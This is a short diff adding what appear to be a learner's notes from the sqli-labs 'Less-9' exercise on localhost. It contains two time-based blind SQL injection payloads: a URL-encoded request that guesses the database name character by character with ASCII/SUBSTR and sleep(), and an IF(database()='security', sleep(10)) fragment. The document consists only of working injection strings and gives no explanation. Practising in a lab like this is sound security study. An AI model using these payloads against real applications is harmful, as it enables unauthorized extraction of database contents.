@@ -1,0 +1,6 @@
+http://localhost:8080/Less-9/?id=1%27%20AND%20ASCII(SUBSTR(DATABASE(),1,1))%20%3E%2097%20AND%20sleep(20);--+
+
+
+another one 
+
+ AND if ((select database()="security"),sleep(10),NULL);
